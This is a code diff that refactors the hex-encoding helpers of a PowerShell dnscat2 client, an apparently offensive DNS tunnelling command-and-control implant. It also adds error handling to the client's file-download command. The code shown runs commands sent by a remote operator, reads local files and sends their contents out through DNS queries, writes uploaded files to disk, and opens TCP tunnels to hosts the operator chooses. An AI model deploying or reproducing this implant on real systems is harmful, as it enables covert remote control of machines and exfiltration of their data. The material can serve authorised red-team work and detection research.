@@ -1,12 +1,25 @@
-function ConvertTo-HexArray ($String) {
-    return [System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($String)).split("-")
+function Convert-StringToHex ($String) {
+    return ([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($String)).split("-") -join "")
 }
 
-function Convert-HexString ($HexString) {
+function Convert-BytesToHex ($Bytes) {
+    return ([System.BitConverter]::ToString($Bytes) -replace '-')
+}
+
+function Convert-HexToBytes ($Hex) {
+    [byte[]]$Bytes = @()
+    while ($Hex.Length -gt 0) {
+        $Bytes += [Convert]::ToInt16(($Hex[0..1] -join ""),16)
+        $Hex = $Hex.Substring(2)
+    }
+    return $Bytes
+}
+
+function Convert-HexToString ($Hex) {
     $StringData = ""
-    while ($HexString.Length -gt 0) {
-        $StringData += [string][char][Convert]::ToInt16(($HexString[0..1] -join ""),16)
-        $HexString = $HexString.Substring(2)
+    while ($Hex.Length -gt 0) {
+        $StringData += [string][char][Convert]::ToInt16(($Hex[0..1] -join ""),16)
+        $Hex = $Hex.Substring(2)
     }
     return $StringData
 }
@@ -47,7 +60,7 @@ function Get-NextDnscat2Data ($DataQueue, $MaxMSGDataSize) {
     }
     
     $DataQueue = $DataQueue -replace '(..(?!$))','$1-' -split '-'
-    #$DataQueue = ConvertTo-HexArray $DataQueue
+    #$DataQueue = Convert-StringToHex $DataQueue
     $PacketCount = 0    # Tracks the total chars in the packet
     $SectionCount = 0    # Tracks the chars in each section between dots
     $Packet = ""
@@ -249,7 +262,7 @@ function Read-FromDnscat2Tunnel ($Session, $TunnelId) {
         $Session["Tunnels"][$TunnelId]["StreamReadOperation"] = $Session["Tunnels"][$TunnelId]["Stream"].BeginRead($Session["Tunnels"][$TunnelId]["StreamDestinationBuffer"], 0, $Session["Tunnels"][$TunnelId]["BufferSize"], $null, $null)
 
         # Queue tunnel packets
-        $Data = ([System.BitConverter]::ToString($Data) -replace '-')
+        $Data = Convert-BytesToHex $Data
         $PacketId = (New-RandomDNSField)
         $PacketId = ([Convert]::ToString(([convert]::ToUInt16($PacketId, 16) -band ( -bnot [uint16]([Math]::Floor(1 * [Math]::Pow(2,15))))),16)).PadLeft(4, '0')
         $PacketLengthField = ([Convert]::ToString(($PacketId.Length/2 + 2 + $TunnelId.Length/2 + $Data.Length/2),16)).PadLeft(8, '0')
@@ -261,11 +274,7 @@ function Read-FromDnscat2Tunnel ($Session, $TunnelId) {
 
 function Send-ToDnscat2Tunnel ($Session, $TunnelId, $Data) {
     try {
-        [byte[]]$Bytes = @()
-        while ($Data.Length -gt 0) {
-            $Bytes += [Convert]::ToInt16(($Data[0..1] -join ""),16)
-            $Data = $Data.Substring(2)
-        }
+        [byte[]]$Bytes = Convert-HexToBytes $Data
         $Session["Tunnels"][$TunnelId]["Stream"].Write($Bytes, 0, $Bytes.Length)
     } catch {
         $Session["Tunnels"][$TunnelId].Dead = $True
@@ -348,7 +357,7 @@ function Update-Dnscat2CommandSession ($Session) {
             "0002" # COMMAND_EXEC
             {
                 $NewSessionName = $Session.CommandFields.split("00")[0]
-                $NewSessionCommand = Convert-HexString $Session.CommandFields.split("00")[2]
+                $NewSessionCommand = Convert-HexToString $Session.CommandFields.split("00")[2]
                 $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0002" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" $NewSessionCommand
                 $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                 $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
@@ -358,31 +367,35 @@ function Update-Dnscat2CommandSession ($Session) {
             }
             "0003" # COMMAND_DOWNLOAD
             {
-                $FileName = Convert-HexString $Session.CommandFields.TrimEnd('00')
-                $FileHexDump = ([System.BitConverter]::ToString([IO.File]::ReadAllBytes($FileName)) -replace '-')
-                $PacketLengthField = ([Convert]::ToString((4 + $FileHexDump.Length/2),16)).PadLeft(8, '0')
-                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0003" + $FileHexDump)
-                $Session["DriverDataQueue"] += $DriverData
-                return $Session
+                try {
+                    $FileName = Convert-HexToString $Session.CommandFields.TrimEnd('00')
+                    $FileHexDump = Convert-BytesToHex ([IO.File]::ReadAllBytes($FileName))
+                    $PacketLengthField = ([Convert]::ToString((4 + $FileHexDump.Length/2),16)).PadLeft(8, '0')
+                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0003" + $FileHexDump)
+                    $Session["DriverDataQueue"] += $DriverData
+                } catch {
+                    $ErrorCode = $CommandId
+                    $Reason = (Convert-StringToHex "Could not read file. Make sure to provide the full path!") + "00"
+                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
+                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "FFFF" + $ErrorCode + $Reason)
+                    $Session["DriverDataQueue"] += $DriverData
+                }
             }
             "0004" # COMMAND_UPLOAD
             {
                 try {
                     $Data = $Session['CommandFields']
-
-                    $FileName = Convert-HexString ($Data[0..($Data.IndexOf('00') - 1)] -join '')
+                    
+                    $FileName = Convert-HexToString ($Data[0..($Data.IndexOf('00') - 1)] -join '')
                     [String]$Data = (($Data[($Data.IndexOf('00') + 2)..$Data.Length]) -join '')
-                    [byte[]]$Bytes = @()
-                    while ($Data.Length -gt 0) {
-                        $Bytes += [Convert]::ToInt16(($Data[0..1] -join ""),16)
-                        $Data = $Data.Substring(2)
-                    }
+                    
+                    [byte[]]$Bytes = Convert-HexToBytes $Data
                     [IO.File]::WriteAllBytes($FileName, $Bytes) 2>&1 | Out-Null
                 } catch {
                     $ErrorCode = $CommandId
-                    $Reason = ((ConvertTo-HexArray "Could not write file") -join "") + "00"
+                    $Reason = (Convert-StringToHex "Could not write file") + "00"
                     $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
-                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0004" + $ErrorCode + $Reason)
+                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "FFFF" + $ErrorCode + $Reason)
                     $Session["DriverDataQueue"] += $DriverData
                 }
             }
@@ -398,7 +411,7 @@ function Update-Dnscat2CommandSession ($Session) {
             {
                 try {
                     $Tunnel = New-Object System.Collections.Hashtable
-                    $Tunnel.Add("Host", (Convert-HexString $Session["CommandFields"].Substring(0, $Session["CommandFields"].Length - 4)).Trim(0))
+                    $Tunnel.Add("Host", (Convert-HexToString $Session["CommandFields"].Substring(0, $Session["CommandFields"].Length - 4)).Trim(0))
                     $Tunnel.Add("Port", [Convert]::ToUInt16($Session["CommandFields"].Substring($Session["CommandFields"].Length - 4), 16))
                     $Tunnel.Add("TunnelId", ((New-RandomDNSField) + (New-RandomDNSField)))
                     $Session["Tunnels"].Add($Tunnel.TunnelId, $Tunnel)
@@ -408,7 +421,7 @@ function Update-Dnscat2CommandSession ($Session) {
 
                     if ($Session["Tunnels"][$Tunnel.TunnelId].Dead) {
                         $ErrorCode = $CommandId
-                        $Reason = ((ConvertTo-HexArray "Failed to start tunnel") -join "") + "00"
+                        $Reason = (Convert-StringToHex "Failed to start tunnel") + "00"
                         $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                         $DriverData = ($PacketLengthField + $Session.PacketIdBF + "1000" + $ErrorCode + $Reason)
                         $Session["DriverDataQueue"] += $DriverData
@@ -418,7 +431,7 @@ function Update-Dnscat2CommandSession ($Session) {
                     $Session["DriverDataQueue"] += $DriverData
                 } catch {
                     $ErrorCode = $CommandId
-                    $Reason = ((ConvertTo-HexArray "Failed to start tunnel") -join "") + "00"
+                    $Reason = (Convert-StringToHex "Failed to start tunnel") + "00"
                     $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
                     $DriverData = ($PacketLengthField + $Session.PacketIdBF + "1000" + $ErrorCode + $Reason)
                     $Session["DriverDataQueue"] += $DriverData
@@ -447,7 +460,7 @@ function Read-DataFromDriver ($Session) {
         if($Host.UI.RawUI.KeyAvailable) {
             $Data = ((Read-Host) + "`n")
         }
-        $Session["DriverDataQueue"] += (ConvertTo-HexArray $Data) -join ""
+        $Session["DriverDataQueue"] += (Convert-StringToHex $Data)
         return $Session
     } elseif ($Session["Driver"] -eq "command") {
     
@@ -478,13 +491,13 @@ function Read-DataFromDriver ($Session) {
         if($Session["StdOutReadOperation"].IsCompleted) {
             $StdOutBytesRead = ($Session["Process"]).StandardOutput.BaseStream.EndRead($Session["StdOutReadOperation"])
             if($StdOutBytesRead -eq 0){ $Session.Dead = $True; return $Session }
-            $Session["DriverDataQueue"] += ([System.BitConverter]::ToString($Session["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)]).split("-") -join "")
+            $Session["DriverDataQueue"] += Convert-BytesToHex ($Session["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)])
             $Session["StdOutReadOperation"] = ($Session["Process"]).StandardOutput.BaseStream.BeginRead($Session["StdOutDestinationBuffer"], 0, 65536, $null, $null)
         }
         if($Session["StdErrReadOperation"].IsCompleted) {
             $StdErrBytesRead = ($Session["Process"]).StandardError.BaseStream.EndRead($Session["StdErrReadOperation"])
             if($StdErrBytesRead -eq 0){ $Session.Dead = $True; return $Session }
-            $Session["DriverDataQueue"] += ([System.BitConverter]::ToString($Session["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)]).split("-") -join "")
+            $Session["DriverDataQueue"] += Convert-BytesToHex ($Session["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)])
             $Session["StdErrReadOperation"] = ($Session["Process"]).StandardError.BaseStream.BeginRead($Session["StdErrDestinationBuffer"], 0, 65536, $null, $null)
         }
     }
@@ -493,12 +506,12 @@ function Read-DataFromDriver ($Session) {
 
 function Send-DataToDriver ($Data, $Session) {
     if ($Session["Driver"] -eq "console") {
-        $StringData = Convert-HexString $Data
+        $StringData = Convert-HexToString $Data
         Write-Host -n $StringData
     } elseif ($Session["Driver"] -eq "command") {
         $Session["CommandPacketBuffer"] += $Data
     } elseif ($Session["Driver"] -eq "exec") {
-        $StringData = Convert-HexString $Data
+        $StringData = Convert-HexToString $Data
         ($Session["Process"]).StandardInput.WriteLine($StringData.TrimEnd("`r").TrimEnd("`n"))
     }
     return $Session
@@ -653,7 +666,7 @@ function Start-Dnscat2 {
     if ($Name -eq '') {
         $Name = $Driver + ' (' + (hostname) + ')'
     }
-    $SYNOptions += ((ConvertTo-HexArray $Name) -join '') + '00'
+    $SYNOptions += (Convert-StringToHex $Name) + '00'
     
     $Sessions = New-Object System.Collections.Hashtable
     $DeadSessions = @()
